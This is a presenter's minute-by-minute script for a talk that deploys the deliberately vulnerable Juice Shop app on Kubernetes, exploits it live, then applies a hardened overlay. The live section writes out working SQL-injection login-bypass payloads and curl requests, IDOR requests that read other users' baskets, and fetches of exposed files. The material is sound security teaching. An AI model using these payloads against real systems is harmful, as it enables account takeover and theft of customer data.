# Run of Show — 30 minutes, slides + live demo

A minute-by-minute script for presenting the deck in tandem with the live app.
Target: ~12 min slides, ~13 min live, ~5 min Q&A/buffer.

## Pre-flight (do this BEFORE the clock starts)

- [ ] Cluster up, Juice Shop deployed, load balancer resolving.
- [ ] NetworkPolicy enforcement enabled on the VPC CNI (or the egress demo won't block).
- [ ] Hardened overlay **NOT** applied yet — baseline must be vulnerable.
- [ ] Terminal open in `~/upwind-assessment`, **large font**, with:
  ```bash
  export JUICE=http://$(kubectl -n juice-shop get svc juice-shop \
    -o jsonpath='{.status.loadBalancer.ingress[0].hostname}')
  echo "$JUICE"          # confirm it printed a URL
  curl -s "$JUICE/rest/admin/application-version"   # confirm app is up
  ```
- [ ] Browser: one tab on `$JUICE` (Juice Shop), one on the deck. DevTools ready.
- [ ] Backup: a 2-min screen recording of each exploit, in case live networking dies.
- [ ] A scratch note with the LB URL pasted, in case the env var is lost.

---

## Part 1 — Slides (0:00–6:30)

**Slide 1 · Cover (0:00–0:30)**
"I'm Taylor. The brief was to stand up a Kubernetes environment, break it, and show
how I'd defend it. I built it the way I'd build a real one — so let's start there, then
I'll break it live."

**Slide 2 · The brief + approach (0:30–1:30)**
One sentence on the ask. Then the three points: built as code, a real posture, and the
app left deliberately vulnerable so the exploits land. Don't dwell.

**Slide 3 · Architecture (1:30–3:30)** — your most important slide.
Walk the diagram top to bottom: attacker → one public load balancer → pod on a private
node → egress through one NAT. Land the line: **"one public door; everything else is
private, so the only thing an outsider can touch is the app."** Mention the API endpoint
is locked to my IP.

**Slide 4 · Tradeoffs (3:30–5:00)**
Pick **three**, don't read all six. Suggested: EKS over self-managed, Terraform over
clicking, private nodes + one NAT (call the single NAT a conscious lab shortcut). The
message: spend complexity where it teaches something, keep the rest boring.

**Slide 5 · Built as code + scanned (5:00–6:30)**
Point at the one-command deploy and the 61 resources. Then the Checkov triage — the
story is **"I didn't silence findings, I sorted them"**: fixed the two real ones (audit
logging, IMDSv2), proved three false, accepted the rest with reasons.
> Optional 20-sec proof it's real — flip to terminal:
> ```bash
> kubectl get nodes
> kubectl get pods -n juice-shop
> ```
> Then straight back to the deck.

**Slide 6 · Three ways in (6:30–7:00)** — the hand-off.
"Rather than talk about these, let me show you. Three different classes of bug." Say the
three (injection, access control, misconfig) and **switch to the browser.**

---

## Part 2 — LIVE (7:00–20:00) — ~13 minutes

> Pattern for each: show the slide for ~15 sec as a launch pad (title + one sentence),
> then DO it. Don't read the slide and then repeat it live.

### Exploit 1 · SQL injection (7:00–10:00)

**Browser (visual):** on the login page, email = `' OR 1=1--`, any password → you're in
as admin. Point to the top-right: now an admin session. "No password. The input became
SQL."

**Terminal (the raw proof):**
```bash
curl -s "$JUICE/rest/user/login" -H 'Content-Type: application/json' \
  -d '{"email":"'"'"' OR 1=1--","password":"x"}' | jq '.authentication.umail'
# -> "admin@juice-sh.op"
```
Say: "That `OR 1=1` is always true; the `--` comments out the password check. A `UNION`
payload would read arbitrary tables — this is full database read."

> Grab a token for the next step while you're here:
> ```bash
> TOKEN=$(curl -s "$JUICE/rest/user/login" -H 'Content-Type: application/json' \
>   -d '{"email":"'"'"' OR 1=1--","password":"x"}' | jq -r '.authentication.token')
> ```

### Exploit 2 · Broken access control / IDOR (10:00–13:00)

**Point:** "I'm authenticated now — but the API never checks the basket is *mine*."

**Terminal:**
```bash
curl -s "$JUICE/rest/basket/2" -H "Authorization: Bearer $TOKEN" | jq '.data.Products[].name'
curl -s "$JUICE/rest/basket/3" -H "Authorization: Bearer $TOKEN" | jq '.data.Products[].name'
# -> items from baskets that aren't mine
```
Say: "Change one number in the URL and I'm reading another customer's cart. Count up
through the ids and you harvest everyone. This is the one no firewall fixes — it has to
be fixed in the code."

> Optional browser version: open DevTools → Network, view your own basket, then replay
> the request with a different id. Visual, but the curl is faster on stage.

### Exploit 3 · Security misconfiguration (13:00–15:30)

**Browser:** navigate to `$JUICE/ftp/acquisitions.md` → a confidential doc loads. Then
`$JUICE/#/administration` → the admin panel renders.

**Terminal:**
```bash
curl -s "$JUICE/ftp/acquisitions.md" | head
```
Say: "No auth, no trick — leftover defaults. Confidential files and an admin surface,
just sitting there. This is usually the first foothold, and it's the bridge to the
platform side."

### The hardening flip (15:30–20:00) — the payoff

**Show the "before" — egress is open:**
```bash
kubectl -n juice-shop exec deploy/juice-shop -- \
  sh -c 'curl -m 5 -s -o /dev/null -w "%{http_code}\n" https://example.com'
# -> 200  (the pod can phone home)
```

**Apply the hardened overlay:**
```bash
kubectl label ns juice-shop pod-security.kubernetes.io/enforce=restricted --overwrite
kubectl apply -f k8s/hardened/juice-shop-hardened.yaml
kubectl -n juice-shop rollout status deploy/juice-shop
```

**Show the "after" — egress is blocked:**
```bash
kubectl -n juice-shop exec deploy/juice-shop -- \
  sh -c 'curl -m 5 -s https://example.com || echo BLOCKED-BY-NETWORKPOLICY'
# -> BLOCKED-BY-NETWORKPOLICY
```

**The line to land:** "The SQL injection still works — I didn't patch the code. But the
pod is now non-root, read-only, no capabilities, and can't talk to anything. The hole is
still there; the blast radius is gone. That's the whole idea."

> If anything misbehaves live, cut to the backup recording and narrate over it. Don't
> debug on stage.

---

## Part 3 — Back to slides (20:00–25:30)

**Slide · One bug, three places to stop it (20:00–21:30)**
The defense-in-depth table. "Every row: fix the code, box it in, and still be able to
see it." This is the synthesis of what they just watched.

**Slide · If this were production (21:30–23:00)**
What I'd add for real: WAF at the edge, scoped identities + managed secrets, scanned
images. **Lead with runtime detection** — "you ship assuming the code has bugs,
so you need to see the moment one gets used." Note it's a recommendation here, kept off
the lab on purpose.

**Slide · If it happened for real (23:00–24:30)**
Walk the six IR beats quickly. Land the panel line: "the bug was the way in, but it
stayed an incident, not a breach, because the controls capped the damage and left
evidence."

**Slide · Closing (24:30–25:30)**
"Fix the code, expect the next bug anyway." Recap in one breath, point to the repo,
thank them.

**Q&A / buffer (25:30–30:00)** — ~4.5 min. If you ran long, the IR slide is the one to
compress; if short, open the live environment back up and take requests.

---

## Timing cheat-sheet

| Block | Window |
|---|---|
| Slides 1–6 (intro → hand-off) | 0:00 – 7:00 |
| Live: SQLi | 7:00 – 10:00 |
| Live: IDOR | 10:00 – 13:00 |
| Live: Misconfig | 13:00 – 15:30 |
| Live: Hardening flip | 15:30 – 20:00 |
| Slides: defense / prod / IR / close | 20:00 – 25:30 |
| Q&A / buffer | 25:30 – 30:00 |

## If you're running out of time (cut in this order)
1. Drop the optional `kubectl get nodes` proof on slide 5.
2. Compress the IR slide to just the one-liner.
3. Do IDOR as a single curl, skip the browser version.
4. Trust the defense table; don't re-explain each fix.
